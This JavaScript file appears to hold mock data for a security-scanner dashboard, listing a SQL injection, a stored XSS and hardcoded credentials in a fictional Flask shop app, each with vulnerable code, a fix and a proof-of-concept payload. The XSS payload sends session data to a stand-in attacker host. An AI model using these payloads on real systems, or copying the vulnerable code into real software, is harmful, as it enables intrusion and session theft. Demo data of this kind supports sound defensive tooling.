const mockData = {
  session_id: 'sess_8f3k2m9q1p7x',
  score: 58,
  summary:
    'SecureAgent found 3 exploitable issues across 47 Python files in acme-shop-api. A critical SQL injection in the login handler could allow full database compromise. An authenticated XSS in profile rendering enables session hijacking. A hardcoded database password in settings increases blast radius if the repo is leaked.',
  stats: {
    files: 47,
    total: 3,
    critical: 1,
    high: 1,
    medium: 1,
  },
  vulnerabilities: [
    {
      id: 'VULN-001',
      title: 'SQL injection in login query',
      file: 'app/routes/auth.py',
      line: 34,
      owasp: 'A03:2021 – Injection',
      severity: 'critical',
      explanation:
        'User-supplied email is concatenated directly into a raw SQL string passed to cursor.execute(). An attacker can bypass authentication or exfiltrate data using UNION-based payloads.',
      business_impact:
        'Full customer database exposure including emails, password hashes, and order history. Regulatory fines under GDPR and complete loss of customer trust.',
      broken_code: `def login(request):
    email = request.form["email"]
    password = request.form["password"]
    query = f"SELECT id, password_hash FROM users WHERE email = '{email}'"
    cursor.execute(query)
    row = cursor.fetchone()
    if row and check_password(password, row[1]):
        session["user_id"] = row[0]
        return redirect("/dashboard")
    return render_template("login.html", error="Invalid credentials")`,
      fixed_code: `def login(request):
    email = request.form["email"]
    password = request.form["password"]
    cursor.execute(
        "SELECT id, password_hash FROM users WHERE email = %s",
        (email,),
    )
    row = cursor.fetchone()
    if row and check_password(password, row[1]):
        session["user_id"] = row[0]
        return redirect("/dashboard")
    return render_template("login.html", error="Invalid credentials")`,
      fix_effort: '15 min',
      poc_payload: `' OR '1'='1' --`,
    },
    {
      id: 'VULN-002',
      title: 'Stored XSS in user profile bio',
      file: 'app/routes/profile.py',
      line: 52,
      owasp: 'A03:2021 – Injection',
      severity: 'high',
      explanation:
        'The bio field is saved from POST data and rendered with Markup(user.bio) without sanitisation. Any authenticated user can inject JavaScript that executes in other users’ browsers when they view the profile.',
      business_impact:
        'Account takeover via stolen session cookies, defacement of user profiles, and phishing attacks delivered from a trusted domain.',
      broken_code: `@app.route("/profile/<username>")
def show_profile(username):
    user = User.query.filter_by(username=username).first_or_404()
    return render_template(
        "profile.html",
        username=user.username,
        bio=Markup(user.bio),
    )`,
      fixed_code: `import bleach

ALLOWED_TAGS = ["b", "i", "em", "strong", "a"]
ALLOWED_ATTRS = {"a": ["href", "title"]}

@app.route("/profile/<username>")
def show_profile(username):
    user = User.query.filter_by(username=username).first_or_404()
    safe_bio = bleach.clean(
        user.bio or "",
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True,
    )
    return render_template(
        "profile.html",
        username=user.username,
        bio=Markup(safe_bio),
    )`,
      fix_effort: '30 min',
      poc_payload: `<img src=x onerror="fetch('/api/session').then(r=>r.text()).then(t=>fetch('https://attacker.example/log?c='+btoa(t)))">`,
    },
    {
      id: 'VULN-003',
      title: 'Hardcoded database credentials in settings',
      file: 'app/config/settings.py',
      line: 12,
      owasp: 'A07:2021 – Identification and Authentication Failures',
      severity: 'medium',
      explanation:
        'Production database username and password are committed directly in source code. Anyone with repository access—or anyone who finds a public fork—can connect to the database.',
      business_impact:
        'Credential rotation requires a code deploy. Leaked secrets enable direct database access, amplifying impact of other vulnerabilities such as SQL injection.',
      broken_code: `class Settings:
    DEBUG = False
    SECRET_KEY = "dev-only-change-me"
    DATABASE_URL = "postgresql://shop_admin:S3cr3tP@ss!2024@db.internal.acme-shop.io:5432/shop_prod"
    REDIS_URL = "redis://localhost:6379/0"`,
      fixed_code: `import os

class Settings:
    DEBUG = False
    SECRET_KEY = os.environ["SECRET_KEY"]
    DATABASE_URL = os.environ["DATABASE_URL"]
    REDIS_URL = os.environ.get("REDIS_URL", "redis://localhost:6379/0")`,
      fix_effort: '20 min',
      poc_payload: 'grep -R "postgresql://" app/config/settings.py',
    },
  ],
  attack_path: {
    nodes: [
      {
        id: 'settings-secret',
        file: 'app/config/settings.py',
        vuln_type: 'hardcoded_secret',
        severity: 'medium',
      },
      {
        id: 'auth-sqli',
        file: 'app/routes/auth.py',
        vuln_type: 'sql_injection',
        severity: 'critical',
      },
      {
        id: 'profile-xss',
        file: 'app/routes/profile.py',
        vuln_type: 'xss',
        severity: 'high',
      },
    ],
    edges: [
      {
        from: 'settings-secret',
        to: 'auth-sqli',
        reason: 'Leaked DB creds enable offline password cracking after SQLi dump',
      },
      {
        from: 'auth-sqli',
        to: 'profile-xss',
        reason: 'Admin session stolen via SQLi login bypass plants stored XSS',
      },
    ],
  },
  heatmap: [
    {
      file: 'app/routes/auth.py',
      risk_score: 92,
      vulns: 1,
      line_count: 148,
    },
    {
      file: 'app/routes/profile.py',
      risk_score: 74,
      vulns: 1,
      line_count: 96,
    },
    {
      file: 'app/config/settings.py',
      risk_score: 61,
      vulns: 1,
      line_count: 42,
    },
    {
      file: 'app/routes/orders.py',
      risk_score: 18,
      vulns: 0,
      line_count: 214,
    },
    {
      file: 'app/models/user.py',
      risk_score: 12,
      vulns: 0,
      line_count: 87,
    },
    {
      file: 'app/utils/validators.py',
      risk_score: 8,
      vulns: 0,
      line_count: 63,
    },
    {
      file: 'app/__init__.py',
      risk_score: 5,
      vulns: 0,
      line_count: 55,
    },
  ],
}

export default mockData
